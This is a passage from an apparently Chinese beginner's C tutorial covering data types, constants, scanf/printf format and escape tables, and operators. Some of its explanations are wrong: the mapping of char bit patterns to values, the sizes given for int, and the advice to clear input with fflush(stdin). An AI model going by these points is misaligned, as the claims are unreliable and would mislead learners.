&lt;p>#include 是一个预处理命令（c语言中以#开头的命令称为预处理命令，类似还有#define）用来引入头文件。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>return 0; 用于退出程序，并向操作系统返回一个数值0.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一句完整的c语言代码用分号“;”（&lt;strong>英文小写&lt;/strong>）作为结束符号&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="c语言简介">C语言简介&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener"
>百度百科&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener"
>维基百科&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>重点&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>C语言是一门&lt;strong>面向过程&lt;/strong>的&lt;strong>高级语言&lt;/strong>&lt;/li>
&lt;li>C语言仍然保持跨平台特性&lt;/li>
&lt;li>未完待续。。。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="编写环境">编写环境&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这里仅为初学者，没有开发项目需求的读者推荐以下开发软件&lt;/p>
&lt;/li>
&lt;li>
&lt;p>软件名称超链接对应的软件的基本操作入门，Download超链接为下载地址。这里提供的软件下载地址部分是国外网站，如果无法打开可以百度软件名下载&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">软件&lt;/th>
&lt;th style="text-align:center">简介&lt;/th>
&lt;th style="text-align:center">链接&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;a class="link" href="https://blog.csdn.net/C20180630/article/details/53185725" target="_blank" rel="noopener"
>Dev C++&lt;/a>&lt;/td>
&lt;td style="text-align:center">个人觉得最适合新手的集成开发环境，同时具有简单项目的开发能力。傻瓜式安装即点即用&lt;!-- raw HTML omitted -->同时支持中文，缺点大概是无法跨平台（需要跨平台的也就不是新手了）&lt;/td>
&lt;td style="text-align:center">&lt;a class="link" href="https://sourceforge.net/projects/orwelldevcpp/" target="_blank" rel="noopener"
>Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a class="link" href="http://www.dotcpp.com/wp/818.html" target="_blank" rel="noopener"
>Code Blocks&lt;/a>&lt;/td>
&lt;td style="text-align:center">很多文章鼓吹的集成开发环境，博主本人没有使用过，但是口碑一直不错。&lt;!-- raw HTML omitted -->作为一款开源软件同时支持跨平台就是其优点&lt;/td>
&lt;td style="text-align:center">&lt;a class="link" href="https://sourceforge.net/projects/codeblocks/" target="_blank" rel="noopener"
>Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a class="link" href="http://c.biancheng.net/cpp/html/2888.html" target="_blank" rel="noopener"
>Visual C++ 6.0&lt;/a>&lt;/td>
&lt;td style="text-align:center">微软老牌集成开发环境，&lt;del>个人感觉几近过时&lt;/del>是前计算机二级指定开发环境&lt;!-- raw HTML omitted -->除非是学习单片机开发的，或者熟悉二级考试环境，不建议使用&lt;/td>
&lt;td style="text-align:center">&lt;a class="link" href="http://c.biancheng.net/cpp/html/1117.html" target="_blank" rel="noopener"
>Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a class="link" href="http://c.biancheng.net/cpp/html/3384.html" target="_blank" rel="noopener"
>Visual Studio 2010&lt;/a>&lt;/td>
&lt;td style="text-align:center">微软集成开发环境，全国计算机二级新标准指定的软件&lt;/td>
&lt;td style="text-align:center">&lt;a class="link" href="http://c.biancheng.net/cpp/html/3383.html" target="_blank" rel="noopener"
>Download&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">Visual Studio (latest)&lt;/td>
&lt;td style="text-align:center">不是很推荐新手使用最新版的Visual Studio，&lt;!-- raw HTML omitted -->微软最新的vs对诸多c++语法做了安全方面的限制&lt;/td>
&lt;td style="text-align:center">No Download&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="基本数据类型">基本数据类型&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>在了解基本数据类型之前我们需要对计算机存储空间单位换算有个基本概念&lt;/p>
&lt;ul>
&lt;li>最小单位bit（位）：即一个二进制位&lt;/li>
&lt;li>Byte（字节）：1 Byte=8 bit&lt;/li>
&lt;li>KB（千字节）：1 KB=1024 Byte&lt;/li>
&lt;li>MB（兆字节）：1 MB=1024 KB&lt;/li>
&lt;li>GB（吉字节）：1 GB=1024 MB&lt;/li>
&lt;li>TB（太字节）：1 TB=1024 GB&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://zhidao.baidu.com/question/6318898" target="_blank" rel="noopener"
>更多相关资料链接&lt;/a>&lt;/p>
&lt;hr>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="整数类型">整数类型&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">类型&lt;/th>
&lt;th style="text-align:left">存储大小&lt;/th>
&lt;th style="text-align:left">取值范围&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">1 byte&lt;/td>
&lt;td style="text-align:left">-2^7~2^7-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">2 byte（32bit）&lt;!-- raw HTML omitted -->4 Byte（64bit）&lt;/td>
&lt;td style="text-align:left">-2^15~2^15-1 &lt;!-- raw HTML omitted -->-2^31~2^31-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">2 byte&lt;/td>
&lt;td style="text-align:left">-2^15~2^15-1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">4 byte&lt;/td>
&lt;td style="text-align:left">-2^31~2^31-1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>int型在32位程序和64位程序中所能表示的范围是不一样的，所以表中会有两个范围.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重点:&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>结合之前对存储单位的科普。我们知道1 Byte=8bit即1字节等于8个比特位。计算机内部其实只认识1和0，也就是二进制。所以计算机对任何数据的处理都是转换成对应的二进制。1字节对应8个二进制位即：&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000 -- 11111111
&lt;/code>&lt;/pre>&lt;p>用8个位子随意组合摆放0，1可以由2^8种组合，计算机内部将这2^8种组合在一一映射到实际的数值上。列如：&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000 --&amp;gt; -2^7=-128
00000001 --&amp;gt; -2^7+1=-127
···
10000000 --&amp;gt; 0
10000001 --&amp;gt; 1
···
11111111 --&amp;gt; 2^7-1=127
&lt;/code>&lt;/pre>&lt;p>所以我们就有了&lt;/p>
&lt;pre tabindex="0">&lt;code>char 1 Byte（字节）范围 -2^7~2^7 即 -128~127
&lt;/code>&lt;/pre>&lt;p>其他类型也可以同样的方法计算范围。也正如表中所给的数值范围，全部以2的次幂记忆。如:&lt;/p>
&lt;pre tabindex="0">&lt;code>int 在64位下 大小为4Byte（字节）
4 Byte=4*8 bit=32bit
也就是32个二进制bit位
所以int型的范围可以表示为
-2^31~2^31-1
（有没有奇怪为森魔要-1？因为数字0的存在）
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>unsigned &amp;amp; signed&lt;/li>
&lt;/ul>
&lt;p>值得一提的是c语言种对基本数据类型还有两个修饰符可以使用：&lt;/p>
&lt;pre tabindex="0">&lt;code>unsigned 中文释义：无符号
signed 中文释义：有符号
&lt;/code>&lt;/pre>&lt;p>顾名思义，举例来说，如果我们使用unsigned修饰int型&lt;/p>
&lt;pre tabindex="0">&lt;code>unsigned char x;
/* 如此声明的这个变量x的取值范围就会变成 0~2^8-1 即 0-255 */
&lt;/code>&lt;/pre>&lt;p>而signed有符号，以上常用数据类型默认都是由signed（有符号修饰的）所以他们的范围从负数开始，如果你加上unsigned（无符号）那么所有的数据类型范围将是从0开始&lt;/p>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="浮点类型">浮点类型&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">类型&lt;/th>
&lt;th style="text-align:left">存储大小&lt;/th>
&lt;th style="text-align:left">取值范围&lt;/th>
&lt;th style="text-align:left">精度&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">4 Byte&lt;/td>
&lt;td style="text-align:left">1.2E-38 ~ 3.4E+38&lt;/td>
&lt;td style="text-align:left">6位小数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">8 Byte&lt;/td>
&lt;td style="text-align:left">2.3E-308 ~ 1.7E+308&lt;/td>
&lt;td style="text-align:left">15位小数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long double&lt;/td>
&lt;td style="text-align:left">16 Byte&lt;/td>
&lt;td style="text-align:left">3.4E-4932 ~ 1.1E+4932&lt;/td>
&lt;td style="text-align:left">19位小数&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>有关浮点型的相关问题属于较有深度的问题，这里不做探究&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="void类型">void类型&lt;/h3>
&lt;p>void类型呢是一个比较特殊的类型。&lt;/p>
&lt;ul>
&lt;li>用来修饰函数表明函数返回值位空，即不存在返回值&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
void main(){
printf(&amp;quot;hello world&amp;quot;);
return;
}
/*
还记得return吗，用于结束函数并向操作系统或者上级调用函数返回一个数值。如果这个函数是用void修饰的，列如这里的main()函数，这里return就不必返回一个数值（如果你还是写作return 0;还会报错）
*/
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>用来修饰函数参数表明该函数不接受参数&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int func(void){
printf(&amp;quot;hallo world&amp;quot;);
return 0;
}
int main(){
func();
return 0;
}
//其实默认括号内为空就表示没有参数，即void是可以省略的
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>用来修饰指针代表对象地址，而不是一个类型。（关于指针会在指针部分详解）&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="常量">常量&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>常量，是写死在程序里，在程序运行过程中不可更改的量&lt;/p>
&lt;/li>
&lt;li>
&lt;p>定义方法&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//所有基本数据类型均可以定义对应常量
#define N 100
#define Good true
#define x 1.2345
#define newline '\n'
//你也可以使用那个const关键字定义常量
const double x=0.123456;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="基本输入输出语句">基本输入输出语句&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int i; //声明整形变量i
int x,y; //声明整形变量x，y
float a;
double b;
char ch; //声明字符变量ch
scanf(&amp;quot;%d&amp;quot;,&amp;amp;i); //从键盘输入数字i
scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;x,&amp;amp;y); //从键盘同时输入数字x,y
scanf(&amp;quot;%f %lf&amp;quot;,&amp;amp;a,&amp;amp;b);
scanf(&amp;quot;%c&amp;quot;,&amp;amp;ch); //从键盘读入一个字符ch
printf(&amp;quot;hallo world\n&amp;quot;); //打印固定字符串
printf(&amp;quot;%d\n&amp;quot;,i); //打印单个数字
printf(&amp;quot;你输入的x=%d,y=%d\n&amp;quot;,x,y);//格式化输出
printf(&amp;quot;单精度a=%f;双精度b=%.3lf&amp;quot;,a,b);//打印输出浮点类型，并限制位数
printf(&amp;quot;%c&amp;quot;,ch);//打印单个字符
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>以下是样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>10
2 3
1.234 3.141592654
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>以下是输出&lt;/p>
&lt;pre tabindex="0">&lt;code>hallo world
10
你输入的x=2,y=3
单精度a=1.234000;双精度b=3.142
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>你可能会奇怪不是应该还输入一个单个字符吗，为什么没有了，其实那个单个字符就是两个小数最后的回车符所以你也看到了我的输出其实多了一行，对那就是那个最后输入的回车符。&lt;/li>
&lt;li>&amp;ldquo;%.3f&amp;quot;这个写法是限制小数后打印三位，默认四舍五入&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>请努力理解以上代码，结合下方给出的资料&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>格式输出符号&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">格式输出符号&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">%a&lt;/td>
&lt;td style="text-align:left">浮点数、十六进制数字和p-记数法（c99&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%A&lt;/td>
&lt;td style="text-align:left">浮点数、十六进制数字和p-记法（c99）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%c&lt;/td>
&lt;td style="text-align:left">一个字符(char)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%C&lt;/td>
&lt;td style="text-align:left">一个ISO宽字符&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%d&lt;/td>
&lt;td style="text-align:left">有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%e&lt;/td>
&lt;td style="text-align:left">浮点数、e-记数法&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%E&lt;/td>
&lt;td style="text-align:left">浮点数、E-记数法&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%f&lt;/td>
&lt;td style="text-align:left">单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%g&lt;/td>
&lt;td style="text-align:left">根据数值不同自动选择%f或%e．&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%G&lt;/td>
&lt;td style="text-align:left">根据数值不同自动选择%f或%e.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%i&lt;/td>
&lt;td style="text-align:left">有符号十进制数（与%d相同）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%o&lt;/td>
&lt;td style="text-align:left">无符号八进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%p&lt;/td>
&lt;td style="text-align:left">指针&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%s&lt;/td>
&lt;td style="text-align:left">对应字符串char*（%s = %hs = %hS 输出 窄字符）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%S&lt;/td>
&lt;td style="text-align:left">对应宽字符串WCAHR*（%ws = %S 输出宽字符串）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%u&lt;/td>
&lt;td style="text-align:left">无符号十进制整数(unsigned int)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%x&lt;/td>
&lt;td style="text-align:left">使用十六进制数字0xf的无符号十六进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%X&lt;/td>
&lt;td style="text-align:left">使用十六进制数字0xf的无符号十六进制整数&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%%&lt;/td>
&lt;td style="text-align:left">打印一个百分号&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64d&lt;/td>
&lt;td style="text-align:left">用于INT64 或者 long long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64u&lt;/td>
&lt;td style="text-align:left">用于UINT64 或者 unsigned long long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%I64x&lt;/td>
&lt;td style="text-align:left">用于64位16进制数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>基本常用的就是整数，小数，字符，字符串的输出。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>转义字符&lt;/p>
&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">转义字符&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;th style="text-align:left">ASCII码值&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">\a&lt;/td>
&lt;td style="text-align:left">响铃(BEL)&lt;/td>
&lt;td style="text-align:left">007&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\b&lt;/td>
&lt;td style="text-align:left">退格(BS) ，将当前位置移到前一列&lt;/td>
&lt;td style="text-align:left">008&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\f&lt;/td>
&lt;td style="text-align:left">换页(FF)，将当前位置移到下页开头&lt;/td>
&lt;td style="text-align:left">012&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\n&lt;/td>
&lt;td style="text-align:left">换行(LF) ，将当前位置移到下一行开头&lt;/td>
&lt;td style="text-align:left">010&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\r&lt;/td>
&lt;td style="text-align:left">回车(CR) ，将当前位置移到本行开头&lt;/td>
&lt;td style="text-align:left">013&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\t&lt;/td>
&lt;td style="text-align:left">水平制表(HT) （跳到下一个TAB位置）&lt;/td>
&lt;td style="text-align:left">009&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\v&lt;/td>
&lt;td style="text-align:left">垂直制表(VT)&lt;/td>
&lt;td style="text-align:left">011&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\\&lt;/td>
&lt;td style="text-align:left">代表一个反斜线字符'''&lt;/td>
&lt;td style="text-align:left">092 ​&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">'&lt;/td>
&lt;td style="text-align:left">代表一个单引号（撇号）字符&lt;/td>
&lt;td style="text-align:left">039&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;quot;&lt;/td>
&lt;td style="text-align:left">代表一个双引号字符&lt;/td>
&lt;td style="text-align:left">034&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\0&lt;/td>
&lt;td style="text-align:left">空字符(NULL)&lt;/td>
&lt;td style="text-align:left">000&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\ddd&lt;/td>
&lt;td style="text-align:left">1到3位八进制数所代表的任意字符&lt;/td>
&lt;td style="text-align:left">三位八进制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">\xhh&lt;/td>
&lt;td style="text-align:left">1到2位十六进制所代表的任意字符&lt;/td>
&lt;td style="text-align:left">二位十六进制&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>难点&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>scanf()函数，以空格或者回车符作为截断。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言中的输入输出缓冲区机制&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在C/C++中，输入输出事实上是各自有一个缓冲区的。缓冲区故名思意。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在你的键盘，屏幕和程序实际获得输入之间还有一个缓冲区。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你按下的按键会被先存放到缓冲区内，接着程序从&lt;strong>输入缓冲区&lt;/strong>读取。处理完毕之后将输出写在&lt;strong>输出缓冲区&lt;/strong>内，屏幕再从输出缓冲区内读取输出并显示给你。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>并不是你想象中的你按下的每一个字符都会直接被程序接收&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当再输入的时候涉及到了字符，或者字符串，并且你发现输入的数据并没有按照你的需要，按照你所想的进行，多半是因为在输入缓冲区内有你之前输入操作时遗留的字符在里面（简单举例，你使用scanf输入一个数字并且按下回车，数字被程序从输入缓冲区读取，但是遗留下来了一个回车符，如果你紧接着读取一个字符，就会出现你意料之外的情况，也就是上述输入输出示例代码中的情况。）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当输入缓冲区出现问题时可以使用如下代码清除缓冲区：&lt;/p>
&lt;pre tabindex="0">&lt;code>fflush(stdin);
&lt;/code>&lt;/pre>&lt;p>&lt;del>然而并不是所有的编译器支持这个函数&lt;/del>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="运算符">运算符&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="算术运算符">算术运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">含义&lt;/th>
&lt;th style="text-align:left">实列&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">+&lt;/td>
&lt;td style="text-align:left">把两个操作数相加&lt;/td>
&lt;td style="text-align:left">A + B 将得到 30&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">-&lt;/td>
&lt;td style="text-align:left">从第一个操作数中减去第二个操作数&lt;/td>
&lt;td style="text-align:left">A - B 将得到 -10&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">*&lt;/td>
&lt;td style="text-align:left">把两个操作数相乘&lt;/td>
&lt;td style="text-align:left">A * B 将得到 200&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">/&lt;/td>
&lt;td style="text-align:left">分子除以分母&lt;/td>
&lt;td style="text-align:left">B / A 将得到 2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">%&lt;/td>
&lt;td style="text-align:left">取模运算符，整除后的余数&lt;/td>
&lt;td style="text-align:left">B % A 将得到 0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">++&lt;/td>
&lt;td style="text-align:left">自增运算符，整数值增加 1&lt;/td>
&lt;td style="text-align:left">A++ 将得到 11&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;ndash;&lt;/td>
&lt;td style="text-align:left">自减运算符，整数值减少 1&lt;/td>
&lt;td style="text-align:left">A&amp;ndash; 将得到 9&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>重点&lt;/li>
&lt;/ul>
&lt;p>自增自减运算符的理解&lt;/p>
&lt;ul>
&lt;li>自增自减少运算符仅支持整数类型&lt;/li>
&lt;li>逻辑关系
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int x=0;
printf(&amp;quot;%d\n&amp;quot;,x++);
printf(&amp;quot;%d\n&amp;quot;,x);
printf(&amp;quot;%d\n&amp;quot;,--x);
printf(&amp;quot;%d\n&amp;quot;,x);
return 0;
}
&lt;/code>&lt;/pre>样例输出
&lt;pre tabindex="0">&lt;code>0
1
0
0
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>当这两个运算符出现在程序语句中时&lt;/li>
&lt;li>如果位于变量前，则先执行自增（或自减）再执行程序语句&lt;/li>
&lt;li>如果位于变量之后，则先执行程序语句，再进行自增（或自减）&lt;/li>
&lt;/ul>
&lt;p>除此之外c语言还支持如下的写法简化：&lt;/p>
&lt;pre tabindex="0">&lt;code>i=i+1; 可以写作 i+=1;
i=i*10; 可以写作 i*=10;
i=i/2; 可以写作 i/=2;
i=i-5; 可以写作 i-=5;
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="关系运算符">关系运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">==&lt;/td>
&lt;td style="text-align:left">检查两个操作数的值是否相等，如果相等则条件为真。&lt;/td>
&lt;td style="text-align:left">(A == B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">!=&lt;/td>
&lt;td style="text-align:left">检查两个操作数的值是否相等，如果不相等则条件为真。&lt;/td>
&lt;td style="text-align:left">(A != B) 为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;gt;&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否大于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;gt; B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;lt;&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否小于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;lt; B) 为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;gt;=&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;gt;= B) 不为真。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;lt;=&lt;/td>
&lt;td style="text-align:left">检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;lt;= B) 为真。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="逻辑运算符">逻辑运算符&lt;/h3>
&lt;p>这里假设A=10，B=20&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&amp;amp;&amp;amp;&lt;/td>
&lt;td style="text-align:left">称为逻辑与运算符。如果两个操作数都非零，则条件为真。&lt;/td>
&lt;td style="text-align:left">(A &amp;amp;&amp;amp; B) 为假。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">||&lt;/td>
&lt;td style="text-align:left">称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。&lt;/td>
&lt;td style="text-align:left">(A&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">!&lt;/td>
&lt;td style="text-align:left">称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。&lt;/td>
&lt;td style="text-align:left">!(A &amp;amp;&amp;amp; B) 为真。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="按位运算符">按位运算符&lt;/h3>
&lt;p>位运算符作用于位，并逐位执行操作。&amp;amp;、 | 和 ^ 的真值表如下所示：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>p&lt;/th>
&lt;th>q&lt;/th>
&lt;th>p &amp;amp; q&lt;/th>
&lt;th>p | q&lt;/th>
&lt;th>p ^ q&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示：&lt;/p>
&lt;pre tabindex="0">&lt;code>A = 0011 1100
B = 0000 1101
-----------------
